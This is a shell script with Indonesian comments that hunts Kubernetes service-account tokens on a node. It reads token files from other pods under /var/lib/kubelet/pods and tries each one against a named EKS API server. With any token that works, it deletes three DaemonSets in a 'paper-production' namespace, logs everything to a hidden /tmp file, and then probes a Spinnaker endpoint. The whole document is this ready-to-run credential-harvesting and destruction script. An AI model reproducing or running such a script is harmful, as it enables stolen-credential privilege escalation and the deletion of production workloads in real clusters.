exec > /tmp/.token-hunt 2>&1
echo "=== HUNTING SA TOKENS WITH DAEMONSET DELETE PERMISSION ==="

APISERVER=https://26CCA808836B146CF8F7D1D708DFEE80.sk1.ap-southeast-3.eks.amazonaws.com

# Cari semua token files dari running pods
find /var/lib/kubelet/pods -name token -maxdepth 7 2>/dev/null | while read tf; do
  TOKEN=$(cat $tf 2>/dev/null)
  if [ -z "$TOKEN" ]; then continue; fi
  
  # Test apakah token ini bisa delete daemonset
  RESULT=$(curl -sk --max-time 3 -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/namespaces/paper-production/daemonsets/node-health-installer" 2>/dev/null | head -c 100)
  
  if echo "$RESULT" | grep -q "kind.*DaemonSet\|metadata"; then
    echo "FOUND TOKEN THAT CAN READ DS!"
    echo "File: $tf"
    # Coba DELETE
    DEL=$(curl -sk --max-time 5 -X DELETE -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/namespaces/paper-production/daemonsets/node-health-installer?propagationPolicy=Background" 2>/dev/null | head -c 200)
    echo "DELETE RESULT: $DEL"
    
    # Delete lainnya juga
    for ds in sys-reload allnodes459; do
      curl -sk --max-time 5 -X DELETE -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/namespaces/paper-production/daemonsets/$ds?propagationPolicy=Background" 2>/dev/null | head -c 100
      echo " ($ds)"
    done
    break
  fi
done

echo "=== ALSO CHECK SPINNAKER NOW ==="
curl -sk --max-time 5 https://spinnaker-api.paper.id/health 2>/dev/null
echo ""
echo "DONE"
